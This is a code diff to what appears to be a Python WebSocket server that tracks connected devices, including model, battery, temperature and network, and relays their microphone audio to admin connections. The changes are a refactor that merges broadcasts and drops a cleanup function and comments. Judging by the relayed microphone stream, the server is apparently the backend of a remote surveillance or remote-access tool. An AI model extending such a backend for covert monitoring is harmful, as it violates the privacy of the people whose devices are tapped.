@@ -46,21 +46,8 @@ class Manager:
     async def connect_client(self, client_id, ws, ip):
         self.clients[client_id] = ws
         self.update_client(client_id, ip, status="online")
-        self.cleanup_old_clients(ip, client_id)
-
-    def cleanup_old_clients(self, ip, keep_id):
-        """Удаляет все записи с тем же IP, кроме текущего."""
-        try:
-            con = sqlite3.connect(DB)
-            cur = con.cursor()
-            cur.execute("DELETE FROM clients WHERE ip=? AND id!=?", (ip, keep_id))
-            con.commit()
-            con.close()
-        except Exception as e:
-            print(f"cleanup_old_clients error: {e}")
 
     def cleanup_dead_clients(self):
-        """Удаляет записи, которые offline больше 1 дня."""
         try:
             cutoff = (datetime.now() - timedelta(days=1)).isoformat()
             con = sqlite3.connect(DB)
@@ -70,7 +57,7 @@ class Manager:
             con.commit()
             con.close()
             if deleted > 0:
-                print(f"cleanup_dead_clients: удалено {deleted} старых записей")
+                print(f"cleanup_dead_clients: удалено {deleted}")
         except Exception as e:
             print(f"cleanup_dead_clients error: {e}")
 
@@ -134,7 +121,6 @@ class Manager:
         return False
 
     def list_clients(self):
-        """Возвращает ТОЛЬКО онлайн-клиентов (у кого открыт сокет)."""
         con = sqlite3.connect(DB)
         cur = con.cursor()
         cur.execute("SELECT id, ip, last_seen, status, model, battery, temp, net FROM clients")
@@ -142,9 +128,7 @@ class Manager:
         con.close()
         result = []
         for row in rows:
-            client_id = row[0]
-            # Показываем только тех, у кого реально открыт сокет
-            if client_id in self.clients:
+            if row[0] in self.clients:
                 result.append((row[0], row[1], row[2], "online",
                                row[4], row[5], row[6], row[7]))
         return result
@@ -155,10 +139,8 @@ manager = Manager()
 
 async def self_ping():
     if not RENDER_URL:
-        print("RENDER_EXTERNAL_URL не задан — self-ping отключён")
         return
     ping_url = RENDER_URL.rstrip("/") + "/health"
-    print(f"Self-ping запущен: {ping_url} каждые {PING_INTERVAL} сек")
     async with httpx.AsyncClient() as client:
         while True:
             try:
@@ -185,17 +167,13 @@ async def client_ws(ws: WebSocket, client_id: str):
     await ws.accept()
     ip = ws.client.host if ws.client else "unknown"
     await manager.connect_client(client_id, ws, ip)
+
     await manager.broadcast_to_admins({
         "type": "client_connected", "client_id": client_id, "ip": ip,
     })
-    # Обновляем список у всех админов
-    for admin in list(manager.admins):
-        try:
-            await admin.send_text(json.dumps({
-                "type": "clients_list", "clients": manager.list_clients(),
-            }))
-        except Exception:
-            pass
+    await manager.broadcast_to_admins({
+        "type": "clients_list", "clients": manager.list_clients(),
+    })
 
     try:
         while True:
@@ -219,8 +197,10 @@ async def client_ws(ws: WebSocket, client_id: str):
                     "client_id": client_id,
                     "info": msg,
                 })
+                await manager.broadcast_to_admins({
+                    "type": "clients_list", "clients": manager.list_clients(),
+                })
 
-            # Аудио микрофона — ретрансляция админам
             if msg.get("type") == "mic_audio":
                 await manager.broadcast_to_admins({
                     "type": "mic_stream",
@@ -239,14 +219,9 @@ async def client_ws(ws: WebSocket, client_id: str):
         await manager.broadcast_to_admins({
             "type": "client_disconnected", "client_id": client_id,
         })
-        # Обновляем список у всех админов — клиент отключился
-        for admin in list(manager.admins):
-            try:
-                await admin.send_text(json.dumps({
-                    "type": "clients_list", "clients": manager.list_clients(),
-                }))
-            except Exception:
-                pass
+        await manager.broadcast_to_admins({
+            "type": "clients_list", "clients": manager.list_clients(),
+        })
 
 
 @app.websocket("/ws/admin")
